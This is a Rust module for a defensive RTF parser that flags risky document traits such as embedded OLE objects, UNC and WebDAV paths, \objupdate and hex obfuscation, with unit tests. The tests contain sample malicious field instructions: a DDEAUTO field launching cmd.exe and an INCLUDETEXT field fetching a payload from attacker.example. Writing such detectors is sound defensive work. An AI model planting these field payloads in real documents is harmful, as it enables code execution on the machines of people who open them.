use crate::rtf::error::{Result, RtfError};
use crate::rtf::hex_decoder::decode_hex_tolerant;
use crate::rtf::ole_extractor;
use crate::rtf::types::{
    ControlWord, DocumentMetadata, OleObject, RtfDocument, RtfFieldInstruction, RtfHeader,
    SuspiciousFlag,
};
use regex::Regex;
use std::collections::BTreeMap;
use std::sync::OnceLock;

/// Cached regex patterns for RTF parsing
fn control_word_regex() -> Option<&'static Regex> {
    static RE: OnceLock<Option<Regex>> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\\([a-zA-Z]+)(-?\d*)").ok())
        .as_ref()
}

fn object_regex() -> Option<&'static Regex> {
    static RE: OnceLock<Option<Regex>> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\{\\object[^}]*\}").ok())
        .as_ref()
}

fn objclass_regex() -> Option<&'static Regex> {
    static RE: OnceLock<Option<Regex>> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r#"\\objclass\s+"([^"]+)"?"#).ok())
        .as_ref()
}

fn objdata_regex() -> Option<&'static Regex> {
    static RE: OnceLock<Option<Regex>> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\\objdata\s+([0-9a-fA-F\s]+)").ok())
        .as_ref()
}

fn unc_path_regex() -> Option<&'static Regex> {
    static RE: OnceLock<Option<Regex>> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\\\\([^\s\\]+)@SSL\\([^\s}]+)").ok())
        .as_ref()
}

/// RTF parser with anti-bomb protections and minimal dependencies
#[derive(Debug)]
pub(crate) struct RtfParser {
    max_depth: usize,
    max_objects: usize,
    max_file_size: usize,
}

impl RtfParser {
    /// Create a new parser with default limits (100 nesting depth, 50 objects, 10MB max size)
    #[must_use]
    pub(crate) fn new() -> Self {
        Self {
            max_depth: 100,
            max_objects: 50,
            max_file_size: 10 * 1024 * 1024, // 10MB
        }
    }

    /// Parse RTF data and extract document structure
    pub(crate) fn parse(&self, data: &[u8]) -> Result<RtfDocument> {
        if data.is_empty() {
            return Err(RtfError::EmptyFile);
        }

        if data.len() > self.max_file_size {
            return Err(RtfError::FileTooLarge {
                size: data.len(),
                max: self.max_file_size,
            });
        }

        // Validate RTF header
        if !data.starts_with(b"{\\rtf") {
            return Err(RtfError::InvalidHeader);
        }

        let text = String::from_utf8_lossy(data);

        // Extract control words
        let control_words = self.extract_control_words(&text);

        // Check for objupdate directive (suspicious)
        let has_objupdate = control_words.iter().any(|cw| cw.name == "objupdate");

        // Extract embedded objects
        let embedded_objects = self.extract_ole_objects(&text);

        if embedded_objects.len() > self.max_objects {
            return Err(RtfError::TooManyObjects {
                count: embedded_objects.len(),
                max: self.max_objects,
            });
        }

        // Calculate nesting depth
        let max_nesting_depth = self.calculate_nesting_depth(&text)?;

        // `\info` group: title/author/manager/etc. — captured via a
        // brace-aware walk so nested groups don't leak across keys.
        let (info_strings, info_numeric) = extract_info_group(&text);

        // `\field` group `\fldinst` instructions — DDEAUTO,
        // INCLUDETEXT, IMPORT, LINK.
        let fields = extract_field_instructions(&text);

        // `\fonttbl` count — single integer surfaced for kv tree.
        let font_count = count_fonttbl_entries(&text);

        let header = RtfHeader {
            version: self.extract_version(&control_words),
            charset: self.extract_charset(&control_words),
            offset: 0,
        };

        let metadata = DocumentMetadata {
            file_size: data.len(),
            object_count: embedded_objects.len(),
            max_nesting_depth,
            has_objupdate,
            detected_charset: self.extract_charset(&control_words),
            info: info_strings,
            info_numeric,
            font_count,
        };

        Ok(RtfDocument {
            header,
            control_words,
            embedded_objects,
            fields,
            metadata,
        })
    }

    /// Extract control words from RTF text
    fn extract_control_words(&self, text: &str) -> Vec<ControlWord> {
        let mut words = Vec::new();
        let Some(re) = control_word_regex() else {
            return words;
        };

        for (i, m) in re.find_iter(text).enumerate() {
            if i > 10000 {
                // Sanity check - prevent excessive parsing
                break;
            }

            if let Some(caps) = re.captures(m.as_str()) {
                if let Some(name_match) = caps.get(1) {
                    let name = name_match.as_str().to_string();
                    let param = caps.get(2).map(|p| p.as_str()).and_then(|s| s.parse().ok());

                    words.push(ControlWord {
                        name,
                        parameter: param,
                        offset: m.start(),
                    });
                }
            }
        }

        words
    }

    /// Extract embedded OLE objects
    fn extract_ole_objects(&self, text: &str) -> Vec<OleObject> {
        let mut objects = Vec::new();

        // Find all \object...{\object directives
        // Look for patterns like: {\object\objemb...{\*\objdata ...}}
        let Some(re) = object_regex() else {
            return objects;
        };

        for m in re.find_iter(text) {
            let object_str = m.as_str();

            // Try to extract objdata (hex-encoded OLE data)
            if let Some((class_name, objdata)) = self.extract_objdata(object_str) {
                let mut flags = Vec::new();

                // Check for OLE header
                let ole_header = if let Ok(header) = ole_extractor::extract_header(&objdata) {
                    flags.push(SuspiciousFlag::ObfuscatedOleHeader);
                    Some(header)
                } else {
                    None
                };

                // Check for obfuscation in hex encoding
                if let Some(hex_start) = object_str.find("objdata") {
                    if detect_hex_obfuscation(&object_str[hex_start..]) {
                        flags.push(SuspiciousFlag::ObfuscatedOleHeader);
                    }
                }

                // Check for UNC paths
                if let Some(unc_path) = extract_unc_path(object_str) {
                    flags.push(SuspiciousFlag::UncPath(unc_path));
                }

                // Check for objupdate
                if object_str.contains("\\objupdate") {
                    flags.push(SuspiciousFlag::ObjUpdateDirective);
                }

                // Check for WebDAV paths
                if object_str.contains("davwwwroot") || object_str.contains("DavWWWRoot") {
                    flags.push(SuspiciousFlag::WebdavPath);
                }

                objects.push(OleObject {
                    class_name,
                    objdata,
                    ole_header,
                    offset: m.start(),
                    suspicious_flags: flags,
                });
            }
        }

        objects
    }

    /// Extract objdata hex string from object directive
    fn extract_objdata(&self, object_str: &str) -> Option<(String, Vec<u8>)> {
        // Extract class name (e.g., "Word.Document.8")
        let class_name = objclass_regex()
            .and_then(|regex| regex.captures(object_str))
            .and_then(|c| c.get(1))
            .map(|m| m.as_str().to_string())
            .unwrap_or_else(|| "Unknown".to_string());

        // Extract hex data from {\*\objdata ...}
        let data_re = objdata_regex()?;

        if let Some(caps) = data_re.captures(object_str) {
            let hex_str = caps.get(1).map(|m| m.as_str())?;
            if let Ok(decoded) = decode_hex_tolerant(hex_str) {
                return Some((class_name, decoded));
            }
        }

        None
    }

    /// Calculate maximum nesting depth to detect zip bombs
    fn calculate_nesting_depth(&self, text: &str) -> Result<usize> {
        let mut max_depth = 0;
        let mut current_depth = 0;

        for ch in text.chars() {
            match ch {
                '{' => {
                    current_depth += 1;
                    if current_depth > max_depth {
                        max_depth = current_depth;
                    }
                    if current_depth > self.max_depth {
                        return Err(RtfError::ExcessiveNesting {
                            depth: current_depth,
                            max: self.max_depth,
                        });
                    }
                }
                '}' => {
                    current_depth = current_depth.saturating_sub(1);
                }
                _ => {}
            }
        }

        Ok(max_depth)
    }

    /// Extract RTF version from control words
    fn extract_version(&self, words: &[ControlWord]) -> u32 {
        words
            .iter()
            .find(|w| w.name == "rtf")
            .and_then(|w| w.parameter)
            .unwrap_or(0) as u32
    }

    /// Extract charset from control words
    fn extract_charset(&self, words: &[ControlWord]) -> Option<String> {
        words.iter().find(|w| w.name == "charset").and_then(|w| {
            w.parameter.map(|p| match p {
                0 => "ANSI".to_string(),
                1 => "Default".to_string(),
                2 => "Symbol".to_string(),
                238 => "Eastern European".to_string(),
                _ => format!("Unknown({})", p),
            })
        })
    }
}

impl Default for RtfParser {
    fn default() -> Self {
        Self::new()
    }
}

/// Extract UNC path from RTF control sequences
fn extract_unc_path(text: &str) -> Option<String> {
    // Look for \\server@SSL\path patterns
    let re = unc_path_regex()?;

    if let Some(caps) = re.captures(text) {
        let server = caps.get(1).map(|m| m.as_str()).unwrap_or("");
        let path = caps.get(2).map(|m| m.as_str()).unwrap_or("");
        return Some(format!("\\\\{}@SSL\\{}", server, path));
    }

    None
}

/// Detect hex obfuscation (whitespace between hex digits)
fn detect_hex_obfuscation(text: &str) -> bool {
    let bytes = text.as_bytes();
    let mut prev_was_hex = false;
    let mut found_spacing = false;

    for &b in bytes {
        let is_hex = b.is_ascii_hexdigit();
        let is_ws = matches!(b, b' ' | b'\t' | b'\n' | b'\r');

        if is_hex {
            if prev_was_hex && found_spacing {
                return true;
            }
            prev_was_hex = true;
            found_spacing = false;
        } else if is_ws && prev_was_hex {
            found_spacing = true;
        } else if !is_ws {
            prev_was_hex = false;
            found_spacing = false;
        }
    }

    false
}

// ---------------------------------------------------------------------------
// `\info` group extraction
// ---------------------------------------------------------------------------

/// Walk the `\info` group and split entries into string and numeric
/// field maps. RTF stores info-group fields as nested groups: each
/// inner brace-pair is one named field whose first control word is
/// the field name and whose remaining text is the value. Numeric
/// fields like `\nofpages` carry the integer as the control-word
/// parameter and have no group body.
///
/// Returns `(strings, numerics)` — empty maps when no `\info` group
/// is present.
fn extract_info_group(text: &str) -> (BTreeMap<String, String>, BTreeMap<String, i64>) {
    let mut strings = BTreeMap::new();
    let mut numerics = BTreeMap::new();
    let bytes = text.as_bytes();

    // Locate `\info` opening; bail when absent.
    let Some(info_start) = text.find("\\info") else {
        return (strings, numerics);
    };

    // Walk forward to find the matching `}` for the group containing
    // `\info`. RTF info groups always live inside `{\info ... }`.
    let mut depth: i32 = 0;
    let mut info_end: Option<usize> = None;
    // Step backward to find the opening `{`.
    let group_open = bytes[..info_start]
        .iter()
        .rposition(|&b| b == b'{')
        .unwrap_or(info_start);
    for (i, &b) in bytes[group_open..].iter().enumerate() {
        match b {
            b'{' => depth += 1,
            b'}' => {
                depth -= 1;
                if depth == 0 {
                    info_end = Some(group_open + i + 1);
                    break;
                }
            }
            _ => {}
        }
    }
    let Some(info_end) = info_end else {
        return (strings, numerics);
    };
    let info_slice = &text[group_open..info_end];

    // Inside `\info`, walk to capture each inner `{\<word> ... }`
    // group as a (key, value) pair. We start *after* the outer
    // `\info` control word so we don't recurse into the wrapper
    // group itself.
    let inner_bytes = info_slice.as_bytes();
    let mut i = info_slice
        .find("\\info")
        .map(|p| p + "\\info".len())
        .unwrap_or(0);
    while i < inner_bytes.len() {
        if inner_bytes[i] != b'{' {
            i += 1;
            continue;
        }
        // Find matching close.
        let mut d: i32 = 0;
        let mut close = None;
        for (k, &c) in inner_bytes[i..].iter().enumerate() {
            match c {
                b'{' => d += 1,
                b'}' => {
                    d -= 1;
                    if d == 0 {
                        close = Some(i + k);
                        break;
                    }
                }
                _ => {}
            }
        }
        let Some(close) = close else { break };

        let inner = &info_slice[i + 1..close]; // strip the `{` and `}`

        // Inner shape: `\<name>[<param>]<space?><value>` — find the
        // first whitespace after the control word; everything after
        // that is the value.
        if let Some(rest) = inner.strip_prefix('\\') {
            let mut name_end = 0;
            for (k, ch) in rest.char_indices() {
                if !ch.is_ascii_alphabetic() {
                    name_end = k;
                    break;
                }
                name_end = rest.len();
            }
            let name = &rest[..name_end];
            let after = &rest[name_end..];

            // Numeric parameter (signed) right after the name?
            let (param, value_start) = parse_int_prefix(after);
            let value = after[value_start..]
                .trim_start_matches([' ', '\t'])
                .trim()
                .to_string();

            if value.is_empty() {
                if let Some(p) = param {
                    numerics.insert(name.to_string(), p);
                }
            } else if !name.is_empty() {
                strings.insert(name.to_string(), strip_rtf_text(&value));
            }
        }

        i = close + 1;
    }

    (strings, numerics)
}

/// Read a leading optional signed decimal integer; return
/// `(Some(value), bytes_consumed)` or `(None, 0)`.
fn parse_int_prefix(s: &str) -> (Option<i64>, usize) {
    let bytes = s.as_bytes();
    let mut end = 0;
    if bytes.first() == Some(&b'-') {
        end = 1;
    }
    while end < bytes.len() && bytes[end].is_ascii_digit() {
        end += 1;
    }
    if end == 0 || (end == 1 && bytes[0] == b'-') {
        (None, 0)
    } else {
        (s[..end].parse().ok(), end)
    }
}

/// Strip simple RTF control sequences from a value string. Doesn't
/// resolve every escape (that would re-implement an RTF renderer);
/// covers the cases that matter for kv-tree readability — `\'XX`
/// hex-byte escapes are left as `?`, and `\\<word>` sequences are
/// dropped.
fn strip_rtf_text(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.peek().copied() {
                // Hex escape: \'XX → unknown byte, render as `?`.
                Some('\'') => {
                    chars.next();
                    let _ = chars.next();
                    let _ = chars.next();
                    out.push('?');
                    continue;
                }
                // Literal-character escapes: \\ \{ \} keep the
                // following character verbatim.
                Some(escaped @ ('\\' | '{' | '}')) => {
                    chars.next();
                    out.push(escaped);
                    continue;
                }
                _ => {}
            }
            // Word escape: skip control word
            while let Some(&p) = chars.peek() {
                if p.is_ascii_alphabetic() {
                    chars.next();
                } else {
                    break;
                }
            }
            // Optional numeric parameter.
            while let Some(&p) = chars.peek() {
                if p.is_ascii_digit() || p == '-' {
                    chars.next();
                } else {
                    break;
                }
            }
            // Optional trailing space terminator on control word.
            if chars.peek() == Some(&' ') {
                chars.next();
            }
            continue;
        }
        if c == '{' || c == '}' {
            continue;
        }
        out.push(c);
    }
    out.trim().to_string()
}

// ---------------------------------------------------------------------------
// `\field` instruction extraction
// ---------------------------------------------------------------------------

fn fldinst_regex() -> Option<&'static Regex> {
    static RE: OnceLock<Option<Regex>> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\\fldinst\s*\{?([^{}]{1,8192})").ok())
        .as_ref()
}

/// Pull `\fldinst` payloads out of every field group and split each
/// into (kind, target). The "kind" is the first whitespace-separated
/// token (DDEAUTO/INCLUDETEXT/IMPORT/LINK/HYPERLINK/etc.); the target
/// is the rest, with surrounding `"` quotes stripped.
fn extract_field_instructions(text: &str) -> Vec<RtfFieldInstruction> {
    let mut out = Vec::new();
    let Some(re) = fldinst_regex() else {
        return out;
    };
    for cap in re.captures_iter(text) {
        let payload = match cap.get(1) {
            Some(m) => strip_rtf_text(m.as_str()),
            None => continue,
        };
        let mut parts = payload.splitn(2, char::is_whitespace);
        let kind = parts.next().unwrap_or("").to_string();
        if kind.is_empty() {
            continue;
        }
        let target = parts
            .next()
            .unwrap_or("")
            .trim()
            .trim_matches('"')
            .to_string();
        let offset = cap.get(0).map(|m| m.start()).unwrap_or(0);
        out.push(RtfFieldInstruction {
            kind: kind.to_uppercase(),
            target,
            offset,
        });
    }
    out
}

// ---------------------------------------------------------------------------
// `\fonttbl` entry counter — small surface used by the kv tree.
// ---------------------------------------------------------------------------

fn count_fonttbl_entries(text: &str) -> usize {
    let Some(start) = text.find("\\fonttbl") else {
        return 0;
    };
    let bytes = text.as_bytes();
    let group_open = bytes[..start]
        .iter()
        .rposition(|&b| b == b'{')
        .unwrap_or(start);
    let mut depth: i32 = 0;
    let mut close = None;
    for (i, &b) in bytes[group_open..].iter().enumerate() {
        match b {
            b'{' => depth += 1,
            b'}' => {
                depth -= 1;
                if depth == 0 {
                    close = Some(group_open + i + 1);
                    break;
                }
            }
            _ => {}
        }
    }
    let Some(close) = close else { return 0 };
    // Each font is a `{\fN ...}` group; count `\f` followed by a digit.
    let slice = &text[group_open..close];
    let mut count = 0;
    let bytes = slice.as_bytes();
    let mut i = 0;
    while i + 1 < bytes.len() {
        if bytes[i] == b'\\' && bytes[i + 1] == b'f' {
            // Require a digit immediately after `f` so we don't count
            // `\fonttbl` itself or `\fcharset`.
            if let Some(&b) = bytes.get(i + 2) {
                if b.is_ascii_digit() {
                    count += 1;
                }
            }
        }
        i += 1;
    }
    count
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_minimal_rtf() {
        let data = b"{\\rtf1\\ansi\\ansicpg1252}";
        let parser = RtfParser::new();
        let doc = parser.parse(data).unwrap();
        assert_eq!(doc.header.version, 1);
    }

    #[test]
    fn test_parse_empty_file() {
        let parser = RtfParser::new();
        assert!(parser.parse(b"").is_err());
    }

    #[test]
    fn test_parse_invalid_header() {
        let parser = RtfParser::new();
        assert!(parser.parse(b"not rtf").is_err());
    }

    #[test]
    fn test_excessive_nesting() {
        let bomb = format!("{{\\rtf1{}", "{".repeat(101));
        let parser = RtfParser::new();
        assert!(matches!(
            parser.parse(bomb.as_bytes()),
            Err(RtfError::ExcessiveNesting { .. })
        ));
    }

    #[test]
    fn test_extract_control_words() {
        let parser = RtfParser::new();
        let words = parser.extract_control_words("{\\rtf1\\ansi\\deff0}");
        assert!(words.iter().any(|w| w.name == "rtf"));
        assert!(words.iter().any(|w| w.name == "ansi"));
    }

    /// `\info` group with a couple of string fields and one numeric.
    #[test]
    fn extract_info_group_captures_strings_and_numerics() {
        let body = "{\\rtf1\\ansi{\\info{\\title Q4 Audit}{\\author John Doe}{\\nofpages3}}}";
        let (s, n) = extract_info_group(body);
        assert_eq!(
            s.get("title").map(std::string::String::as_str),
            Some("Q4 Audit")
        );
        assert_eq!(
            s.get("author").map(std::string::String::as_str),
            Some("John Doe")
        );
        assert_eq!(n.get("nofpages"), Some(&3));
    }

    /// `\info` group with Cyrillic author — the locale-mismatch hook
    /// the trait base will use.
    #[test]
    fn extract_info_group_preserves_cyrillic_author() {
        let body = "{\\rtf1{\\info{\\author Иван Иванов}}}";
        let (s, _n) = extract_info_group(body);
        assert_eq!(
            s.get("author").map(std::string::String::as_str),
            Some("Иван Иванов")
        );
    }

    /// Missing `\info` group is benign — empty maps, no panic.
    #[test]
    fn extract_info_group_missing_returns_empty() {
        let body = "{\\rtf1\\ansi this document has no info group}";
        let (s, n) = extract_info_group(body);
        assert!(s.is_empty());
        assert!(n.is_empty());
    }

    /// `\field` with DDEAUTO instruction is captured with kind +
    /// target split.
    #[test]
    fn extract_field_instructions_captures_ddeauto() {
        let body =
            r#"{\rtf1{\field{\*\fldinst{ DDEAUTO "C:\\Windows\\System32\\cmd.exe" "/c calc" }}}}"#;
        let fields = extract_field_instructions(body);
        assert_eq!(fields.len(), 1);
        assert_eq!(fields[0].kind, "DDEAUTO");
        assert!(fields[0].target.contains("cmd.exe"));
    }

    /// INCLUDETEXT field with a remote URL.
    #[test]
    fn extract_field_instructions_captures_includetext_url() {
        let body =
            r#"{\rtf1{\field{\*\fldinst{INCLUDETEXT "https://attacker.example/payload.docx"}}}}"#;
        let fields = extract_field_instructions(body);
        assert_eq!(fields.len(), 1);
        assert_eq!(fields[0].kind, "INCLUDETEXT");
        assert!(fields[0].target.contains("attacker.example"));
    }

    /// `\fonttbl` entry count.
    #[test]
    fn count_fonttbl_entries_basic() {
        let body = r"{\rtf1{\fonttbl{\f0\fnil Arial;}{\f1\froman Times;}{\f2\fswiss Helvetica;}}}";
        assert_eq!(count_fonttbl_entries(body), 3);
    }

    #[test]
    fn count_fonttbl_entries_missing_returns_zero() {
        assert_eq!(count_fonttbl_entries("{\\rtf1\\ansi}"), 0);
    }
}
